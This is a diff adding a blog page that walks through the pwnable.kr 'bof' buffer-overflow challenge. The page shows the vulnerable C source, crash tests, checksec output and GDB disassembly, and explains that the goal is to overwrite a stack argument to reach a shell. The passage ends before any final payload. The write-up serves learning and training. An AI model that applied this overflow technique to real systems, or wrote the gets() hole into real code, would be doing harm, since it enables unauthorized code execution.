@@ -1,0 +1,951 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>pwnable.kr - bof - aidenpearce369</title>
+<meta name="description" content="A classic buffer overflow challenge ">
+
+
+  <meta name="author" content="Monish Kumar">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="aidenpearce369">
+<meta property="og:title" content="pwnable.kr - bof">
+<meta property="og:url" content="http://localhost:4000/pwn/3-bof/">
+
+
+  <meta property="og:description" content="A classic buffer overflow challenge ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/pwn/pwn.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-03T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/pwn/3-bof/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Monish Kumar",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="J3MnMF94zaZhTUoNtUiRt9cKsr7hiMyTxEdAvQ3GfmY" />
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="aidenpearce369 Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          aidenpearce369
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/pwn">Pwn Challenges</a>
+            </li><li class="masthead__menu-item">
+              <a href="/binexp">Binary Exploitation</a>
+            </li><li class="masthead__menu-item">
+              <a href="/expdev">Exploit Development</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories">All Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags">Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/site_data/avatar.png" alt="Monish Kumar" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Monish Kumar</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Security Analyst and Youtuber</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Chennai, India</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="mailto:driftmonianonymous@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://twitter.com/aidenpearce369" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/aidenmonish/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/aidenpearce369" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://youtube.com/c/ExploitEverything" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-youtube" aria-hidden="true"></i><span class="label">Youtube</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="pwnable.kr - bof">
+    <meta itemprop="description" content="Given two files to download">
+    <meta itemprop="datePublished" content="2021-06-03T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">pwnable.kr - bof
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  9 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Given two files to download</p>
+
+<p><a href="http://pwnable.kr/bin/bof">Binary</a></p>
+
+<p><a href="http://pwnable.kr/bin/bof">Source Code</a></p>
+
+<p>Lets list our files,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<span class="n">total</span> <span class="mi">24</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">ra</span> <span class="n">ra</span> <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">2</span> <span class="mi">16</span><span class="o">:</span><span class="mi">08</span> <span class="p">.</span><span class="o">/</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">ra</span> <span class="n">ra</span> <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">2</span> <span class="mi">16</span><span class="o">:</span><span class="mo">04</span> <span class="p">..</span><span class="o">/</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ra</span> <span class="n">ra</span> <span class="mi">7348</span> <span class="n">Jun</span>  <span class="mi">2</span> <span class="mi">16</span><span class="o">:</span><span class="mi">08</span> <span class="n">bof</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ra</span> <span class="n">ra</span>  <span class="mi">308</span> <span class="n">Jun</span>  <span class="mi">2</span> <span class="mi">16</span><span class="o">:</span><span class="mi">08</span> <span class="n">bof</span><span class="p">.</span><span class="n">c</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ra</span> <span class="n">ra</span>  <span class="mi">126</span> <span class="n">Jun</span>  <span class="mi">2</span> <span class="mi">16</span><span class="o">:</span><span class="mi">09</span> <span class="n">bof</span><span class="p">.</span><span class="n">md</span>
+</code></pre></div></div>
+
+<p>Lets check our binary file type using <code class="language-plaintext highlighter-rouge">file</code> command</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">file</span> <span class="n">bof</span>
+<span class="n">bof</span><span class="o">:</span> <span class="n">ELF</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">shared</span> <span class="n">object</span><span class="p">,</span> <span class="n">Intel</span> <span class="mi">80386</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mi">2</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">24</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="n">ed643dfe8d026b7238d3033b0d0bcc499504f273</span><span class="p">,</span> <span class="n">not</span> <span class="n">stripped</span>
+</code></pre></div></div>
+
+<p>The source code of the binary file is,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+</span><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+	<span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now lets try playing with our binary,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">bof</span>
+<span class="n">fish</span><span class="o">:</span> <span class="n">The</span> <span class="n">file</span> <span class="err">“</span><span class="p">.</span><span class="o">/</span><span class="n">bof</span><span class="err">”</span> <span class="n">is</span> <span class="n">not</span> <span class="n">executable</span> <span class="n">by</span> <span class="n">this</span> <span class="n">user</span>
+<span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">bof</span>
+<span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">bof</span>
+<span class="n">overflow</span> <span class="n">me</span> <span class="o">:</span>
+<span class="n">deadbeef</span>
+<span class="n">Nah</span><span class="p">..</span>
+</code></pre></div></div>
+
+<p>So, it is expecting some different input from us</p>
+
+<p>Lets observe the given binary,</p>
+
+<ul>
+  <li>
+    <p>It has two functions <code class="language-plaintext highlighter-rouge">main()</code> and <code class="language-plaintext highlighter-rouge">func()</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">main()</code> only calls <code class="language-plaintext highlighter-rouge">func()</code></p>
+  </li>
+  <li>
+    <p>The flow of whole binary depends on <code class="language-plaintext highlighter-rouge">func()</code></p>
+  </li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">func()</code> checks the <code class="language-plaintext highlighter-rouge">key</code> value</p>
+  </li>
+  <li>
+    <p>If <code class="language-plaintext highlighter-rouge">key</code> is equal to <code class="language-plaintext highlighter-rouge">0xcafebabe</code> then it spwans a shell</p>
+  </li>
+  <li>
+    <p>Else it displays an error message</p>
+  </li>
+  <li>
+    <p>But, already <code class="language-plaintext highlighter-rouge">func()</code> is loaded with <code class="language-plaintext highlighter-rouge">key</code> in <code class="language-plaintext highlighter-rouge">main()</code> like <code class="language-plaintext highlighter-rouge">func(0xdeadbeef)</code></p>
+  </li>
+</ul>
+
+<p>So we have to perform a “OVERFLOW”</p>
+
+<hr />
+
+<p>Our binary uses <code class="language-plaintext highlighter-rouge">gets()</code> from <code class="language-plaintext highlighter-rouge">#include &lt;string.h&gt;</code></p>
+
+<p>It is possible to perform “BUFFER OVERFLOW” on <code class="language-plaintext highlighter-rouge">gets()</code>, since it is a vulnerable function</p>
+
+<p>Lets try to crash our program,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">bof</span>
+<span class="n">overflow</span> <span class="n">me</span> <span class="o">:</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span class="n">Nah</span><span class="p">..</span>
+<span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">bof</span>
+<span class="n">overflow</span> <span class="n">me</span> <span class="o">:</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span class="n">Nah</span><span class="p">..</span>
+<span class="o">***</span> <span class="n">stack</span> <span class="n">smashing</span> <span class="n">detected</span> <span class="o">***:</span> <span class="n">terminated</span>
+<span class="n">fish</span><span class="o">:</span> <span class="err">“</span><span class="p">.</span><span class="o">/</span><span class="n">bof</span><span class="err">”</span> <span class="n">terminated</span> <span class="n">by</span> <span class="n">signal</span> <span class="n">SIGABRT</span> <span class="p">(</span><span class="n">Abort</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>So we can perform “OVERFLOW” in this binary</p>
+
+<p>Lets check the security mitigations of this binary,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">checksec</span> <span class="p">.</span><span class="o">/</span><span class="n">bof</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ra</span><span class="o">/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="o">/</span><span class="n">bof</span><span class="err">'</span>
+    <span class="n">Arch</span><span class="o">:</span>     <span class="n">i386</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
+</code></pre></div></div>
+
+<hr />
+
+<p>Lets disassemble our program using debugger</p>
+
+<p>Disassembling <code class="language-plaintext highlighter-rouge">main()</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">disassemble</span> <span class="n">main</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
+   <span class="mh">0x0000068a</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="n">ebp</span>
+   <span class="mh">0x0000068b</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x0000068d</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
+   <span class="mh">0x00000690</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+   <span class="mh">0x00000693</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0xdeadbeef</span>
+   <span class="mh">0x0000069a</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x62c</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">&gt;</span>
+   <span class="mh">0x0000069f</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x000006a4</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="n">leave</span>
+   <span class="mh">0x000006a5</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>Disassembling <code class="language-plaintext highlighter-rouge">func()</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">disassemble</span> <span class="n">func</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">func</span><span class="o">:</span>
+   <span class="mh">0x0000062c</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="n">ebp</span>
+   <span class="mh">0x0000062d</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x0000062f</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x48</span>
+   <span class="mh">0x00000632</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">gs</span><span class="o">:</span><span class="mh">0x14</span>
+   <span class="mh">0x00000638</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="n">eax</span>
+   <span class="mh">0x0000063b</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+   <span class="mh">0x0000063d</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x78c</span>
+   <span class="mh">0x00000644</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x645</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;</span>
+   <span class="mh">0x00000649</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x2c</span><span class="p">]</span>
+   <span class="mh">0x0000064c</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+   <span class="mh">0x0000064f</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x650</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>
+   <span class="mh">0x00000654</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0xcafebabe</span>
+   <span class="mh">0x0000065b</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x66b</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
+   <span class="mh">0x0000065d</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x79b</span>
+   <span class="mh">0x00000664</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x665</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;</span>
+   <span class="mh">0x00000669</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x677</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span>
+   <span class="mh">0x0000066b</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x7a3</span>
+   <span class="mh">0x00000672</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x673</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;</span>
+   <span class="mh">0x00000677</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">]</span>
+   <span class="mh">0x0000067a</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;:</span>	<span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">gs</span><span class="o">:</span><span class="mh">0x14</span>
+   <span class="mh">0x00000681</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x688</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>
+   <span class="mh">0x00000683</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x684</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;</span>
+   <span class="mh">0x00000688</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;:</span>	<span class="n">leave</span>
+   <span class="mh">0x00000689</span> <span class="o">&lt;+</span><span class="mi">93</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>Now, here is the interesting part in this <code class="language-plaintext highlighter-rouge">func()</code> function</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x00000654</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0xcafebabe</span>
+</code></pre></div></div>
+
+<p>So the value <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> will be in the stack memory, we just need to replace the value with  <code class="language-plaintext highlighter-rouge">0xcafebabe</code> by overflow</p>
+
+<p>So lets test it with some dummy input and find the offset of <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> from <code class="language-plaintext highlighter-rouge">overflowme</code></p>
+
+<p>Lets set the breakpoints and pass inputs to analyze,</p>
+
+<p>Go for <code class="language-plaintext highlighter-rouge">main()</code> first,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">disassemble</span> <span class="n">main</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
+   <span class="mh">0x0000068a</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="n">ebp</span>
+   <span class="mh">0x0000068b</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x0000068d</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
